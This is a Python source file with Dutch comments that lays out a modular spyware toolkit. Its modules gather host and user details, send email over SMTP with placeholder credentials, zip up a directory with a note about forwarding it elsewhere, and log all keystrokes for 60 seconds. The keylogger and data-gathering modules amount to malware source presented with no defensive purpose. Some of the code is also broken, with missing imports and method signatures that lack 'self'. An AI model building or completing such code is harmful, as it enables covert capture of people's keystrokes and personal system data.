import os
import platform
import socket
import psutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import shutil
import zipfile


class Module:
    def __init__(self):
        self.logmessage = ""

    def run():
        pass
    def log():
        pass

class InfoModule(Module):
    def __init__(self):
        super().__init__()
        self.data =  {}

    def run(self):
        hostname = socket.gethostname()
        self.data["Hostname"] = hostname

        ip_address = socket.gethostbyname(hostname)
        self.data["IP Address"] = ip_address

        self.data["Operating System"] = platform.system()

        username = os.getlogin()
        self.data["Username"] = username

        home_dir = os.path.expanduser("~")
        self.data["Home Directory"] = home_dir

        cpu_count = psutil.cpu_count(logical=True)
        self.data["CPU Count"] = cpu_count

        memory = psutil.virtual_memory()
        self.data["Total Memory"] = memory.total
        self.data["Available Memory"] = memory.available

        disk = psutil.disk_usage('/')
        self.data["Total Disk Space"] = disk.total
        self.data["Used Disk Space"] = disk.used

        self.data["Processor Architecture"] = platform.machine()
        self.data["Network Name"] = platform.node()
        self.data["Processor"] = platform.processor()




    def log(self):
        for key, value in self.data.items():
           self.logmessage += str(key) + ": " + str(value) + "\n"
        return self.logmessage



class MailModule(Module):
    def __init__(self):
        super().__init__()

    
    def run(self):
        # Verbindingsinstellingen voor de SMTP-server
        smtp_server = 'smtp.example.com'
        smtp_port = 587
        username = 'example@example.com'
        password = 'example'
        # E-mailgegevens
        sender = 'example@example.come'
        recipient = 'example@example.com'
        subject = 'Test Email'
        message = 'Dit is een testbericht.'

        # Het e-mailbericht opstellen
        email = MIMEMultipart()
        email['From'] = sender
        email['To'] = recipient
        email['Subject'] = subject

        email.attach(MIMEText(message, 'plain'))
        server = None
        # SMTP-verbinding maken en e-mail verzenden
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(username, password)
            server.sendmail(sender, recipient, email.as_string())
            self.logmessage += 'E-mail succesvol verzonden!'
        except Exception as e:
            self.logmessage += 'Er is een fout opgetreden bij het verzenden van de e-mail:' + str(e)
        finally:
            if server is not None:
                server.quit()

    def log(self):
        return self.logmessage

class DiskModule(Module):
    def __init__(self):
        super().__init__()


    def run(self):
        source_path = './DiskSourceMap'
        destination_path = './DiskDestinationMap'

        zip_file = self.analyze_disk_structure(source_path, destination_path)
        if zip_file:
            self.logmessage += 'Schijfstructuur succesvol geanalyseerd en gecomprimeerd: \n'
        else:
            self.logmessage += 'Fout bij het analyseren van de schijfstructuur.\n'


    def analyze_disk_structure(self, source_path, destination_path):
        # Maak een tijdelijke map voor de verzamelde gegevens
        temp_path = os.path.join(destination_path, 'temp')
        os.makedirs(temp_path, exist_ok=True)

        try:
            # Loop door de bronmap en kopieer alle bestanden en mappen naar de tijdelijke map
            for root, dirs, files in os.walk(source_path):
                # Maak de bijbehorende mapstructuur in de tijdelijke map
                for directory in dirs:
                    os.makedirs(os.path.join(temp_path, os.path.relpath(root, source_path), directory), exist_ok=True)

                # Kopieer de bestanden naar de tijdelijke map
                for file in files:
                    shutil.copy2(os.path.join(root, file), os.path.join(temp_path, os.path.relpath(root, source_path), file))

            # Maak een ZIP-archief van de tijdelijke map
            zip_file_path = os.path.join(destination_path, 'disk_structure.zip')
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(temp_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, temp_path))

            # Verstuur het ZIP-archief naar een externe locatie of sla het lokaal op
            # Hier kun je de code toevoegen om de ZIP-archiefbestand door te sturen naar een externe locatie

            # Verwijder de tijdelijke map
            shutil.rmtree(temp_path)

            return zip_file_path

        except Exception as e:
            # Handel eventuele fouten af
            self.logmessage += 'Fout bij het analyseren van de schijfstructuur: \n'
            return None

            
    def log(self):
        return self.logmessage
    

class KeyModule(Module):
    def __init__(self):
        self.logged_keys = []
        self.listener = None
        
    def on_key_press(self, key):
        try:
            key_char = key.char
            self.logged_keys.append(key_char)
        except AttributeError:
            special_key = self.get_special_key_name(key)
            self.logged_keys.append(f'[{special_key}]')
        
    def get_special_key_name(self, key):
        if key == keyboard.Key.space:
            return 'Space'
        elif key == keyboard.Key.enter:
            return 'Enter'
        elif key == keyboard.Key.backspace:
            return 'Backspace'
        elif key == keyboard.Key.tab:
            return 'Tab'
        # Voeg hier extra speciale toetsen toe als dat nodig is
        
        # Als de speciale toets niet wordt herkend, retourneer gewoon de naam van de toets
        return str(key)
        
    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        
    def stop_logging(self):
        self.listener.stop()
        self.listener.join()
        
    def get_logged_keys(self):
        return ''.join(self.logged_keys)

    def run(self):
        self.start_logging()
        time.sleep(60)  # 60 seconden
        self.stop_logging()
        logged_keys = self.get_logged_keys()
        self.logmessage += "Logged Keys:" +  logged_keys

    def log(self):
        return self.logmessage



